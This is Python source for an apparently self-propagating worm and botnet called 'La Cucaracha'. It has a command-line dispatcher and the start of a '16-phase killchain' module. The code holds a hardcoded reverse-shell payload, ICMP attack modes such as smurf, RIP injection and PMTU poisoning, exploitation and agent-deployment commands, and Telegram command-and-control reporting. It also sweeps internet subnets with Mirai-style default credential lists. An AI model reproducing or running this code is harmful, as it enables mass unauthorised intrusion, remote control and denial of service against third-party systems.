        ok = icmp.icmp_time_exceeded_reset(target, int(sport), int(dport), int(seq))
        print(f"[{'OK' if ok else 'FAIL'}] Time Exceeded reset: {target}:{dport}")
        return

    # Handle --icmp-source-quench
    if args.icmp_source_quench:
        icmp = ICMPEngine(db)
        sent = icmp.icmp_source_quench(args.icmp_source_quench, count=20)
        print(f"[OK] Source Quench: {sent} packets to {args.icmp_source_quench}")
        return

    # Handle --icmp-stego
    if args.icmp_stego:
        icmp = ICMPEngine(db)
        target, msg = args.icmp_stego[0], args.icmp_stego[1]
        icmp.icmp_stego_beacon(target, msg)
        print(f"[OK] Stego beacon to {target}: '{msg}'")
        return

    # Handle --icmp-fragment-overlap
    if args.icmp_fragment_overlap:
        icmp = ICMPEngine(db)
        icmp.icmp_fragment_overlap(args.icmp_fragment_overlap)
        print(f"[OK] Fragment overlap to {args.icmp_fragment_overlap}")
        return

    # Handle --icmp-ttl-sweep
    if args.icmp_ttl_sweep:
        icmp = ICMPEngine(db)
        hops = icmp.icmp_ttl_sweep(args.icmp_ttl_sweep)
        print(f"TTL sweep to {args.icmp_ttl_sweep}: {' -> '.join(hops) if hops else 'no reply'}")
        return

    # Handle --icmp-parameter-problem
    if args.icmp_parameter_problem:
        icmp = ICMPEngine(db)
        ok = icmp.icmp_parameter_problem(args.icmp_parameter_problem)
        print(f"[{'OK' if ok else 'FAIL'}] Parameter Problem: {args.icmp_parameter_problem}")
        return

    # Handle --icmp-multicast-sweep
    if args.icmp_multicast_sweep is not None:
        icmp = ICMPEngine(db)
        hosts = icmp.icmp_multicast_sweep(args.icmp_multicast_sweep)
        print(f"Multicast sweep ({args.icmp_multicast_sweep}): {len(hosts)} hosts")
        for h in hosts:
            print(f"  {h}")
        return

    # Handle --icmp-timing-channel
    if args.icmp_timing_channel:
        icmp = ICMPEngine(db)
        target, data = args.icmp_timing_channel[0], args.icmp_timing_channel[1]
        icmp.icmp_timing_channel_send(target, data.encode())
        print(f"[OK] Timing channel: {len(data)*8} bits to {target}")
        return

    # Handle --icmp-rip
    if args.icmp_rip:
        icmp = ICMPEngine(db)
        target, fake_route = args.icmp_rip[0], args.icmp_rip[1]
        ok = icmp.icmp_rip_injection(target, fake_route)
        print(f"[{'OK' if ok else 'FAIL'}] RIP injection: {target} -> {fake_route}")
        return

    # Handle --icmp-secure-tunnel-send
    if args.icmp_secure_tunnel_send:
        icmp = ICMPEngine(db)
        target, data = args.icmp_secure_tunnel_send[0], args.icmp_secure_tunnel_send[1]
        icmp.icmp_secure_tunnel_send(target, data.encode())
        print(f"[OK] Secure tunnel: {len(data)} bytes to {target}")
        return

    # Handle --icmp-secure-tunnel-listen
    if args.icmp_secure_tunnel_listen:
        icmp = ICMPEngine(db)
        log.info("ICMP secure tunnel listener started (press Ctrl+C to stop)")
        try:
            while True:
                data = icmp.icmp_secure_tunnel_listen(timeout=10)
                for ip, payload in data.items():
                    print(f"[SECURE] {ip}: {len(payload)} bytes -> {payload[:64]}")
        except KeyboardInterrupt:
            icmp.stop()
            log.info("ICMP secure tunnel stopped")
        return

    # Handle --icmp-prefilter (CKAB L1)
    if args.icmp_prefilter:
        icmp = ICMPEngine(db)
        log.info("CKAB ICMP Pre-Filter: testing all targets for TCP liveness...")
        targets = db.get_targets(unexploited_only=True, limit=1000)
        live = 0; dead = 0
        for t in targets:
            ip = t["ip"]
            if icmp.icmp_tcp_liveness_probe(ip):
                live += 1
            else:
                db.execute("UPDATE targets SET exploited=1, notes='icmp_only' WHERE id=?", (t["id"],))
                db.commit()
                dead += 1
        print(f"CKAB Pre-Filter: {live} TCP-live / {dead} ICMP-only (blacklisted)")
        return

    # Handle --icmp-wake (CKAB L2)
    if args.icmp_wake:
        icmp = ICMPEngine(db)
        log.info("CKAB ICMP Wake: attempting TCP stack wake on sleeping targets...")
        targets = db.get_targets(unexploited_only=True, limit=500)
        woke = 0
        for t in targets:
            ip = t["ip"]
            if icmp.icmp_wake_tcp_stack(ip):
                woke += 1
                print(f"  WAKE OK: {ip}")
            time.sleep(0.2)
        print(f"CKAB Wake: {woke} hosts woken")
        return

    # Handle --icmp-os-hint (CKAB L3)
    if args.icmp_os_hint:
        icmp = ICMPEngine(db)
        print(f"{'IP':<20} {'OS':<30} {'TTL':<5} {'Top Creds'}")
        print("-" * 80)
        targets = db.get_targets(unexploited_only=True, limit=100)
        for t in targets:
            ip = t["ip"]
            os_type, creds = icmp.icmp_os_credential_hint(ip)
            print(f"{ip:<20} {os_type:<30} {icmp._get_ttl(ip):<5} {', '.join(creds[:3])}")
        return

    # Handle --icmp-inject (CKAB L4)
    if args.icmp_inject:
        icmp = ICMPEngine(db)
        target = args.icmp_inject
        payload_cmd = b"import socket,subprocess,os;s=s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
        ok = icmp.icmp_inject_payload(target, payload_cmd)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP kernel inject: {target}")
        return

    # Handle --icmp-task-queue (CKAB L5)
    if args.icmp_task_queue:
        log.info("CKAB ICMP Task Queue: starting hold-and-release worker...")
        mesh_engine.start_icmp_task_worker()
        print("CKAB ICMP task worker started - processing pending ICMP tasks...")
        try:
            while True:
                pending = db.execute("SELECT COUNT(*) AS c FROM icmp_tasks WHERE status='pending'").fetchone()["c"]
                done = db.execute("SELECT COUNT(*) AS c FROM icmp_tasks WHERE status='done'").fetchone()["c"]
                print(f"  Pending: {pending} | Done: {done}")
                if pending == 0:
                    print("All ICMP tasks processed. Worker idle.")
                time.sleep(10)
        except KeyboardInterrupt:
            mesh_engine.stop_icmp_task_worker()
            log.info("CKAB ICMP task worker stopped")
        return

    # ---- WormMaster flags ----

    # Handle --exploit (WormMaster single target)
    if args.exploit:
        target_ip = args.exploit
        if ":" in target_ip:
            ip_part, port_part = target_ip.split(":", 1)
        else:
            ip_part, port_part = target_ip, "22"
        print(f"Exploiting {ip_part}:{port_part}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.exploit(ip_part)
        print(json.dumps(result, indent=2))
        return

    # Handle --post-exploit (WormMaster)
    if args.post_exploit:
        print(f"Post-exploitation on {args.post_exploit}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.post_exploit(args.post_exploit, ("root", "root"))
        print(json.dumps(result, indent=2))
        return

    # Handle --deploy-agent (WormMaster)
    if args.deploy_agent:
        print(f"Deploying agent to {args.deploy_agent}...")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.deploy_agent(args.deploy_agent)
        print(f"Agent deployed: {result}")
        return

    # Handle --send-msg (formerly --telegram message)
    if args.send_msg:
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        result = master.c2_telegram(args.send_msg)
        print(f"Telegram sent: {result}")
        return

    # ---- Handle --auto (FULL AUTONOMOUS NAVIGATION) ----
    if args.auto:
        discovery_only = args.discovery_only or False
        log.info(f"=== Autonomous Navigation Mode ===")
        print("\n🚀 LA CUCARACHA — AUTONOMOUS NAVIGATION")
        print(f"   Discovery-only: {discovery_only}")
        print(f"   Self-replicate: {args.replicate}")
        print(f"   Max epochs:     {args.epochs}")
        print(f"   Scan rate:      {args.rate} pps")
        print("=" * 60)
        # Set scan rate on recon engine
        mesh_engine.recon_engine._scan_rate = args.rate
        # Auto-load Telegram from token file or CLI args
        tg_token_auto = args.tg_token or ""
        tg_chat_auto = args.chat_id or ""
        if not tg_token_auto or not tg_chat_auto:
            try:
                with open("/opt/borg/telegram_token.txt") as _f:
                    _lines = _f.read().strip().splitlines()
                    if _lines:
                        tg_token_auto = _lines[0].strip()
                    # Fallback chat ID — always 0 unless user overrides
                    tg_chat_auto = tg_chat_auto or "0"
            except Exception:
                pass
        has_tg_auto = bool(tg_token_auto and tg_chat_auto)
        # Wire Telegram reporting callback
        if telegram_bot:
            mesh_engine.telegram_callback = telegram_bot._send_alert
            if mesh_engine.decision_engine:
                mesh_engine.decision_engine.tg = telegram_bot._send_alert
            if mesh_engine.deployment_engine:
                mesh_engine.deployment_engine.telegram_callback = telegram_bot._send_alert
        elif has_tg_auto:
            mesh_engine.telegram_callback = lambda msg: _send_tg_sweep(tg_token_auto, tg_chat_auto, msg)
            if mesh_engine.decision_engine:
                mesh_engine.decision_engine.tg = mesh_engine.telegram_callback
            if mesh_engine.deployment_engine:
                mesh_engine.deployment_engine.telegram_callback = mesh_engine.telegram_callback
        # Send initial startup notification via whichever callback is wired
        cb = getattr(mesh_engine, 'telegram_callback', None)
        if cb:
            try:
                cb(
                    f"```\n"
                    f"╔══ 🐛 La Cucaracha — Hunting Activated ══╗\n"
                    f"║  🌐 Auto-hunt engaged across all targets\n"
                    f"║  🔄 Max epochs: {args.epochs}\n"
                    f"║  🧬 Self-replicate: {args.replicate}\n"
                    f"║  🔑 Creds: {len(getattr(mesh_engine.exploit_engine, 'cred_pairs', []))} in pool\n"
                    f"╚{'═'*40}╝\n"
                    f"```"
                )
            except Exception:
                pass
        result = mesh_engine.autonomous_navigation(
            discovery_only=discovery_only,
            max_epochs=args.epochs,
        )
        print("\n✅ Autonomous navigation complete:")
        print(f"  Epochs:               {result['epochs']}")
        print(f"  Targets found:        {result['targets_found']}")
        print(f"  Targets exploited:    {result['targets_exploited']}")
        print(f"  Replicants deployed:  {result['replicants_deployed']}")
        print(f"  Mesh spreads:         {result['mesh_spreads']}")
        return

    # ---- Handle --sweep (MONOLITH SUBNET ITERATOR) ----
    if args.sweep:
        if not args.prefix:
            print("❌ --sweep requires --prefix (e.g., --prefix 56.78)")
            return

        prefix = args.prefix
        has_tg = bool(args.tg_token and args.chat_id)

        # Start payload hub in background
        import threading
        hub_thread = threading.Thread(target=deploy.start_payload_hub, daemon=True)
        hub_thread.start()
        payload_gen.generate_all(callback_ip=args.callback_ip or "127.0.0.1", callback_port=args.callback_port or 10001, persist=True)

        total_subnets = args.sweep_end - args.sweep_start + 1
        pwn_count = 0
        fail_count = 0
        all_new_pwns = []

        # 🚨 STARTUP REPORT — send immediately so user knows we're alive
        startup_msg = (
            f"🧬 Auto Sweep Started\n"
            f"🌐 {prefix}.0.0/16 — {total_subnets} x /24\n"
            f"⚡ {args.rate} pps | 🔄 Pause: {args.sweep_pause}s\n"
            f"📊 DB: {db.stats().get('targets', 0)} targets in pool\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"⏳ Sweeping subnet 0/{total_subnets}..."
        )
        if has_tg:
            _send_tg_sweep(args.tg_token, args.chat_id, startup_msg)
        # Wire telegram_callback on mesh_engine for full killchain reports
        if has_tg:
            mesh_engine.telegram_callback = lambda msg: _send_tg_sweep(args.tg_token, args.chat_id, msg)
            # Also wire decision engine
            if mesh_engine.decision_engine:
                mesh_engine.decision_engine.tg = lambda msg: _send_tg_sweep(args.tg_token, args.chat_id, msg)
            # Wire to deployment engine for PayloadHandler reporting
            if mesh_engine.deployment_engine:
                mesh_engine.deployment_engine.telegram_callback = lambda msg: _send_tg_sweep(args.tg_token, args.chat_id, msg)
        log.info(f"🧬 Auto Sweep started — /16: {prefix}.0.0")
        log.info(f"   Range: {args.sweep_start}–{args.sweep_end} | Rate: {args.rate}pps")

        for third in range(args.sweep_start, args.sweep_end + 1):
            subnet = f"{prefix}.{third}.0/24"
            subnet_label = f"/24 #{third - args.sweep_start + 1}/{total_subnets}"
            log(f"\n{'='*60}")
            log(f"📡 {subnet_label}: {subnet}")
            log(f"{'='*60}")

            # Set scan rate on recon engine
            mesh_engine.recon_engine._scan_rate = args.rate

            # Run the full kill chain on this single /24
            cycle_start = time.time()
            try:
                result = mesh_engine.run_full_cycle(
                    subnet=subnet,
                    batch_size=args.batch,
                    max_spread_hops=args.hops,
                    aggressive=args.aggressive,
                    fingerprint_deep=args.fingerprint_deep if hasattr(args, 'fingerprint_deep') else True,
                )
            except Exception as e:
                log(f"❌ Cycle failed for {subnet}: {e}")
                result = {}

            elapsed = time.time() - cycle_start

            # Extract results
            exploited = result.get('exploitation', 0)
            deployed = result.get('deployment', 0)
            hosts_found = result.get('icmp_sweep', 0)
            new_targets = result.get('total_targets_exploited', result.get('new_targets', 0))

            if exploited > 0:
                pwn_count += 1
                all_new_pwns.append(f"   • {subnet}: {exploited} exploited / {deployed} deployed")

            time_remaining = (total_subnets - (third - args.sweep_start + 1)) * (elapsed + args.sweep_pause)
            eta = f"{time_remaining / 60:.0f}m" if time_remaining < 3600 else f"{time_remaining / 3600:.1f}h"

            # DB stats
            stats = db.stats()
            targets_total = stats.get('targets', 0)
            targets_exploited = stats.get('targets_exploited', 0)
            deployments_success = stats.get('deployments_success', 0)

            # Build report
            report = (
                f"🧬 {total_subnets - (third - args.sweep_start) - 1} remaining | "
                f"{subnet}\n"
                f"⏱️ {elapsed:.0f}s | 💥 {exploited} | 📦 {deployed} | ⏳ ETA: {eta}\n"
                f"📊 DB: {targets_total} targets | {targets_exploited} 💥 | {deployments_success} 📦"
            )
            print(f"\n{report}\n", flush=True)

            if has_tg:
                _send_tg_sweep(args.tg_token, args.chat_id, report)

            # Brief pause between subnets
            if third < args.sweep_end:
                time.sleep(args.sweep_pause)

        # Final report
        final_stats = db.stats()
        summary = (
            f"✅ Auto Sweep Complete — {prefix}.0.0/16\n"
            f"📊 {total_subnets} /24 subnets | {pwn_count} with pwns | {fail_count} failures\n"
            f"📊 Final DB:\n"
            f"   • {final_stats.get('targets', 0)} total targets\n"
            f"   • {final_stats.get('targets_exploited', 0)} exploited 💥\n"
            f"   • {final_stats.get('deployments_success', 0)} deployed 📦"
        )
        print(f"\n{summary}\n", flush=True)

        if has_tg:
            _send_tg_sweep(args.tg_token, args.chat_id, summary)

        # Stop payload hub
        deploy.stop_payload_hub()
        log.info("🧬 Auto Sweep complete — returning to shell")
        return

    # Handle --full-cycle
    if args.full_cycle:
        args.scan = True
        args.deploy = True
        args.mesh = True

    # Handle --scan
    if args.scan and not args.deploy and not args.mesh:
        log.info("=== Scan-only mode ===")
        count = mesh_engine.run_reconnaissance(subnet=args.subnet)
        print(f"\nScan complete: {count} new targets discovered")
        stats = db.stats()
        print(f"Total targets in database: {stats['targets']}")

    # Handle --deploy (recon -> exploit -> deploy)
    if args.deploy:
        # Start payload hub in background thread
        import threading
        hub_thread = threading.Thread(target=deploy.start_payload_hub, daemon=True)
        hub_thread.start()
        log.info(f"🚀 Payload hub started on port {args.hub_port}")

        # Generate payloads with proper callback
        callback_ip = args.callback_ip or "127.0.0.1"
        callback_port = args.callback_port or 10001
        payload_gen.generate_all(callback_ip=callback_ip, callback_port=callback_port, persist=True)
        log.info(f"📦 Payloads generated (callback: {callback_ip}:{callback_port})")

        log.info("=== Deploy cycle ===")
        if args.adaptive_payload:
            mesh_engine._adaptive_payload = True
            log.info("Adaptive payload mode enabled")
        if args.ddos_on_obstacle:
            mesh_engine._ddos_on_obstacle = True
            log.info("DDoS-on-obstacle mode enabled")
        result = mesh_engine.run_full_cycle(
            subnet=args.subnet,
            batch_size=args.batch,
            max_spread_hops=args.hops,
            aggressive=args.aggressive,
            fingerprint_deep=args.fingerprint_deep if hasattr(args, 'fingerprint_deep') else True,
        )
        print("\nDeploy cycle complete:")
        print(f"  Stage 1- Alive hosts:  {result.get('icmp_sweep', result.get('exploitation', 0))}")
        print(f"  TCP open ports found:  {result.get('tcp_scan', 0)}")
        print(f"  Targets exploited:     {result.get('exploitation', 0)}")
        print(f"  Deployed:              {result.get('deployment', 0)}")
        print(f"  Mesh spread:           {result.get('mesh_spread', 0)}")
        pmtu = result.get('pmtu_poison', {})
        if pmtu and isinstance(pmtu, dict) and pmtu.get('total', 0) > 0:
            print(f"  PMTU poisoned:         {pmtu['poisoned']}/{pmtu['vulnerable']} vulnerable hosts")
        print(f"  New targets in DB:     {result.get('total_targets_exploited', result.get('new_targets', 0))}")

        # Keep alive — serve payload hub + periodic cycles
        log.info("🌐 Deploy cycle done — entering persistent mesh mode (payload hub on 10004, ctrl+c to stop)")
        try:
            while True:
                time.sleep(60)
                log.info(f"[Hub] Stats: {db.stats()['targets_exploited']} exploited, {db.stats()['deployments_success']} deployed")
                # Periodic re-scan and re-deploy every 5min
                stats = db.stats()
                if stats['targets_exploited'] == 0 and time.time() % 300 < 60:
                    log.info("⏰ No targets yet — running another cycle...")
                    result = mesh_engine.run_full_cycle(
                        subnet=args.subnet, batch_size=args.batch,
                        max_spread_hops=args.hops, aggressive=args.aggressive,
                    )
                    log.info(f"Cycle complete: {result['phases'].get('exploitation', 0)} exploited")
        except KeyboardInterrupt:
            log.info("Shutting down...")
            mesh_engine.stop()
            deploy.stop_payload_hub()
            log.info("💀 La Cucaracha terminated.")

        return

    # Handle --mesh (continuous spreading, trading, mutating)
    if args.mesh:
        log.info("=== Mesh node mode (continuous) ===")
        deploy.start_payload_hub()
        payload_gen.generate_all(callback_ip=args.callback_ip, callback_port=args.callback_port, persist=True)
        log.info("Mesh node operational. Running continuous spread/trade/mutate cycles...")
        cycle_count = 0
        try:
            while True:
                cycle_count += 1
                log.info(f"--- Mesh cycle #{cycle_count} ---")
                spread = mesh_engine.run_mesh_spread(max_hops=args.hops)
                log.info(f"Spread: {spread} new propagations")
                tm = mesh_engine.run_trading_and_mutation()
                log.info(f"Trade: {tm.get('trades', 0)} | Mutations: {tm.get('mutations', 0)}")
                stats = db.stats()
                log.info(f"Status: {stats['nodes_active']} nodes, {stats['targets_exploited']} exploited, {stats['deployments_success']} deploys")
                sleep_time = random.randint(30, 120)
                log.info(f"Sleeping {sleep_time}s before next cycle...")
                for _ in range(sleep_time):
                    if mesh_engine._stop_flag:
                        break
                    time.sleep(1)
        except KeyboardInterrupt:
            log.info("Shutting down mesh node...")
            mesh_engine.stop()
            deploy.stop_payload_hub()
            if node:
                node.stop_heartbeat()
            log.info("Mesh node terminated.")

    # ---- WormMaster Interactive Mode ----
    if args.interactive or not any([args.scan, args.deploy, args.serve, args.mesh,
                                     args.full_cycle, args.auto,
                                     args.status, args.stats, args.clean,
                                     args.exploit, args.post_exploit,
                                     args.deploy_agent, args.send_msg]):
        if not args.interactive and any([args.scan, args.deploy, args.serve, args.mesh,
                                          args.full_cycle, args.auto, args.status,
                                          args.stats, args.clean, args.exploit,
                                          args.post_exploit, args.deploy_agent,
                                          args.send_msg]):
            return  # Already handled above
        print("🧬 LA CUCARACHA v2.0 — Interactive Mode")
        print("Type 'help' for commands, 'exit' to quit")
        master = WormMaster(db=db, mesh_engine=mesh_engine)
        try:
            while True:
                try:
                    cmd = input("\nworm> ").strip()
                    if not cmd:
                        continue
                    if cmd in ("exit", "quit"):
                        break
                    if cmd == "help":
                        print("Commands: deploy, scan <subnet>, exploit <ip>, mesh, status, post-exploit <ip> <user> <pass>, deploy-agent <ip>, telegram <msg>, exit")
                        continue
                    if cmd.startswith("scan"):
                        parts = cmd.split()
                        subnet = parts[1] if len(parts) > 1 else "0.0.0.0/0"
                        result = master.scan(subnet)
                        print(json.dumps(result, indent=2))
                    elif cmd.startswith("exploit"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: exploit <ip>")
                            continue
                        result = master.exploit(parts[1])
                        print(json.dumps(result, indent=2))
                    elif cmd == "deploy":
                        result = master.deploy()
                        print(json.dumps(result, indent=2))
                    elif cmd == "mesh":
                        print("Mesh started (use --mesh flag for continuous mode)")
                    elif cmd == "status":
                        status = master.get_status()
                        print(json.dumps(status, indent=2))
                    elif cmd.startswith("post-exploit"):
                        parts = cmd.split()
                        if len(parts) < 4:
                            print("Usage: post-exploit <ip> <user> <pass>")
                            continue
                        result = master.post_exploit(parts[1], (parts[2], parts[3]))
                        print(json.dumps(result, indent=2))
                    elif cmd.startswith("deploy-agent"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: deploy-agent <ip>")
                            continue
                        result = master.deploy_agent(parts[1])
                        print(f"Deployed: {result}")
                    elif cmd.startswith("telegram"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print("Usage: telegram <message>")
                            continue
                        result = master.c2_telegram(" ".join(parts[1:]))
                        print(f"Sent: {result}")
                    else:
                        print(f"Unknown command: {cmd}")
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"Error: {e}")
        finally:
            master.stop()

    # If no mode specified, show help
    if not any([args.scan, args.deploy, args.serve, args.mesh,
                args.full_cycle, args.auto,
                args.status, args.stats, args.clean,
                args.exploit, args.post_exploit,
                args.deploy_agent, args.send_msg,
                args.interactive,
                args.icmp_tunnel, args.reverse_icmp,
                args.icmp_redirect, args.icmp_mtu,
                args.pmtu_poison, args.pmtu_poison_all,
                args.icmp_smurf, args.icmp_poison_ping,
                args.icmp_rogue_router, args.mqtt_enum,
                args.ssh_inject, args.icmp_os_fingerprint,
                args.icmp_address_mask, args.icmp_record_route,
                args.icmp_time_exceeded, args.icmp_source_quench,
                args.icmp_stego, args.icmp_fragment_overlap,
                args.icmp_ttl_sweep, args.icmp_parameter_problem,
                args.icmp_multicast_sweep, args.icmp_timing_channel,
                args.icmp_rip, args.icmp_secure_tunnel_send,
                args.icmp_secure_tunnel_listen,
                args.icmp_prefilter, args.icmp_wake,
                args.icmp_os_hint, args.icmp_inject,
                args.icmp_task_queue,
                args.stealth, args.stealth_status,
                args.renew_tor, args.fileless,
                args.hide, args.anti_debug,
                args.domain_front, args.tor, args.doh,
            ]):
        parser.print_help()


#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LA CUCARACHA v5.0 — PREDATOR KILLCHAIN (16-PHASE IF/THEN PIPELINE)        ║
║  Full 16-phase execution:                                                  ║
║  📡 ICMP → 🔍 TCP → 🖥️ FP → 🧨 CVE → 🌐 Web → ⚙️ Embed → 🧟 Genzai       ║
║  → 🏢 Enterprise → 🔑 Brute → 🚪 Backdoor → 🔌 Tunnel → 🐛 Worm            ║
║  → 🧠 Intel → 💤 Sleep → 🔄 Crossfeed → 📦 Intel Report                    ║
║                                                                              ║
║  by🇭🇷PhonkAlphabet                                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import base64, concurrent.futures, hashlib, hmac, json, logging, os, random, re
import shutil, signal, socket, sqlite3, ssl, subprocess, sys, threading, time
import urllib.parse, urllib.request
from collections import defaultdict, deque
from datetime import datetime, timezone
from typing import Callable, Dict, List, Optional, Tuple

log = logging.getLogger("lacucaracha_v5.killchain")

VERSION = "5.0"

# ─── C2 ───
C2_HOST = "127.0.0.1"
C2_PORT = 10001
C2_HTTP = f"http://{C2_HOST}:{C2_PORT}"
PAYLOAD_URL = f"http://{C2_HOST}:10004/LaCucaracha.py"

# ─── PHASE ORDER (16 phases) ──────────────────────────────────────────────────
PHASES_16 = [
    "ICMP", "TCP", "FP", "CVE", "WEB", "EMBED", "GENZAI",
    "ENTERPRISE", "BRUTE", "BACKDOOR", "TUNNEL", "WORM",
    "INTEL", "SLEEP", "CROSSFEED", "REPORT"
]

# ─── SERVICE MAPS ─────────────────────────────────────────────────────────────
SERVICE_PRIORITY = {
    23:100, 7547:95, 80:85, 443:84, 8080:83, 8443:82,
    3000:80, 5000:79, 7000:78, 8888:77, 9092:76, 9200:75,
    9443:74, 9999:73, 3306:60, 5432:59, 27017:58, 6379:57,
    5900:40, 3389:39, 22:10, 2222:9, 445:50, 139:48, 135:45,
    1433:55, 1521:54, 4899:35, 161:30, 162:29,
}
SERVICE_EMOJI = {
    23:"🔐", 22:"🔑", 2222:"🔑", 80:"🌐", 443:"🌐", 8080:"🌐", 8443:"🌐",
    3000:"🌐", 5000:"🌐", 7000:"🌐", 8888:"🌐", 3306:"🗄", 5432:"🗄", 27017:"🗄", 6379:"🗄",
    7547:"📡", 5900:"🖼", 3389:"🖥", 445:"🏢", 139:"🏢", 1433:"🗄", 1521:"🗄",
}
SERVICE_NAME = {
    23:"Telnet", 22:"SSH", 2222:"SSH-ALT", 80:"HTTP", 443:"HTTPS", 8080:"HTTP-ALT",
    8443:"HTTPS-ALT", 3000:"Gitea/Node", 5000:"Flask/Django", 7000:"Spring/Java",
    8888:"Jupyter/Webmin", 3306:"MySQL", 5432:"PostgreSQL", 27017:"MongoDB",
    6379:"Redis", 7547:"TR-069", 5900:"VNC", 3389:"RDP", 9092:"Kafka",
    9200:"Elasticsearch", 9443:"HTTPS-ALT", 9999:"Monitoring",
    445:"SMB", 139:"NetBIOS", 1433:"MSSQL", 1521:"Oracle",
    4899:"RAdmin", 161:"SNMP", 162:"SNMP-Trap",
}

MASSCAN_PORTS = "23,22,2222,80,443,8080,8443,7547,3000,5000,7000,8888,9092,9200,9443,9999,3306,5432,27017,6379,5900,3389,161,162,445,139,135,1433,1521,4899"
MASSCAN_RATE = 5000

# ─── CREDENTIAL DATABASES ─────────────────────────────────────────────────────
TELNET_CREDS = [
    ("root",""), ("root","root"), ("root","admin"), ("root","1234"),
    ("root","xc3511"), ("root","vizxv"), ("root","Zte521"), ("root","anko"),
    ("root","realtek"), ("root","default"), ("root","pass"), ("root","12345"),
    ("root","54321"), ("root","7ujMko0vizxv"), ("root","system"),
    ("admin",""), ("admin","admin"), ("admin","1234"), ("admin","password"),
    ("admin","12345"), ("admin","123456"), ("admin","1111"), ("admin","1111111"),
    ("admin","123456789"), ("service","service"), ("user","user"), ("guest","guest"),
    ("support","support"), ("ubnt","ubnt"), ("cisco","cisco"), ("super","super"),
    ("Admin","12345"), ("Admin","admin"), ("root","hi3518"), ("root","jvbzd"),
    ("root","osminox"), ("root","dreambox"), ("root","samsung"),
    ("admin","meinsm"), ("admin","tlJwpbo6"), ("admin","Zte521"), ("admin","pass"),
    ("admin","default"), ("root","12345678"), ("admin","12345678"),
    ("admin","admin123"), ("admin","p@ssw0rd"), ("root","P@ssw0rd"),
    ("admin","changeme"), ("root","changeme"), ("admin","letmein"),
]
WEB_CREDS = TELNET_CREDS + [
    ("admin","admin123"), ("admin","password123"), ("admin","letmein"),
    ("admin","changeme"), ("admin","passw0rd"), ("admin","qwerty"),
    ("admin","12345678"), ("admin","P@ssw0rd"), ("root","P@ssw0rd"),
    ("admin","administrator"), ("admin","default"), ("admin","temp123"),
    ("admin","test123"), ("Administrator","password"), ("admin","demo"),
    ("admin","test"), ("admin","root"), ("root","toor"), ("admin","123456"),
    ("root","123456"), ("admin","password"), ("root","password"),
]
DB_CREDS = [
    ("root",""), ("root","root"), ("root","password"), ("root","admin"),
    ("root","123456"), ("root","P@ssw0rd"), ("admin",""), ("admin","admin"),
    ("admin","password"), ("postgres",""), ("postgres","postgres"),
    ("mongodb",""), ("mongodb","mongodb"), ("redis",""), ("redis","redis"),
]
SSH_CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("root","P@ssw0rd"), ("root","toor"), ("root","qwerty"),
    ("root","1"), ("root","1234"), ("root","changeme"), ("root","letmein"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("admin","admin123"), ("admin","P@ssw0rd"), ("admin","passw0rd"),
]
ENTERPRISE_CREDS = [
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","P@ssw0rd"),
    ("sa","admin123"), ("sa","changeme"), ("administrator",""),
    ("administrator","admin"), ("administrator","password"),
]

# ─── SPIDER SUBNETS ────────────────────────────────────────────────────────────
random.seed()
SPIDER_SUBNETS = []
for oct in range(0, 256):
    for base in ["159.89","159.223","167.71","137.184","143.110","157.230",
                 "138.68","165.22","128.199","178.128","188.166","206.189",
                 "46.101","159.65","104.248","49.12","65.21","95.217"]:
        SPIDER_SUBNETS.append(f"{base}.{oct}.0/24")
SPIDER_SUBNETS += [f"103.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(500)]
SPIDER_SUBNETS += [f"41.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"89.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"91.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"95.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"185.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"31.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"45.{random.randint(0,128)}.{random.randint(0,255)}.0/24" for _ in range(200)]


# ═══════════════════════════════════════════════════════════════════════════════
# DATABASE — Full 16-phase tracking
# ═══════════════════════════════════════════════════════════════════════════════

class KillchainDB:
    """SQLite DB with 16-phase tracking columns."""

    def __init__(self, path: str = "worm_mesh_v5.db"):
        self.path = path
        self._conn = None
        self._connect()
        self._ensure_schema()

    def _connect(self):
        self._conn = sqlite3.connect(self.path, check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        try:
            self._conn.execute("PRAGMA journal_mode=WAL")
        except sqlite3.OperationalError:
            pass  # May fail if inside a transaction — harmless
        try:
            self._conn.execute("PRAGMA synchronous=NORMAL")
        except sqlite3.OperationalError:
            pass
        try:
            self._conn.execute("PRAGMA busy_timeout=5000")
        except sqlite3.OperationalError:
            pass

    def _ensure_schema(self):
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                protocol TEXT DEFAULT 'tcp',
                first_seen TEXT DEFAULT (datetime('now')),
                last_seen TEXT DEFAULT (datetime('now')),
                fp_os TEXT DEFAULT '',
                fp_banner TEXT DEFAULT '',
                fp_service TEXT DEFAULT '',
                fp_ttl INTEGER DEFAULT 0,
                fp_http_server TEXT DEFAULT '',
